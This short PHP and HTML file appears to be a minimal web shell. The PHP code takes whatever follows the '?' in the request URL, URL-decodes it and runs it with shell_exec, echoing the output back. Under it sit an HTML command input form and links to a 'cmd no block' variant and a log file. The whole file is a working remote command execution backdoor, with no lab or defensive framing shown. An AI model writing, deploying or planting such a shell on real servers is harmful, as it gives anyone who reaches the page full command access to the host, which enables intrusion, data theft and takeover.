<pre>
<?php
  $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "?", 1)+1);
  $cmd = urldecode($cmd);
  echo shell_exec($cmd);
?>
</pre>
<form action="/">
  <input type="text" placeholder="command">
</form>
<br>
<a href="/cmd_noblock.php">cmd no block</a>
<a href="/log.txt">log file</a>
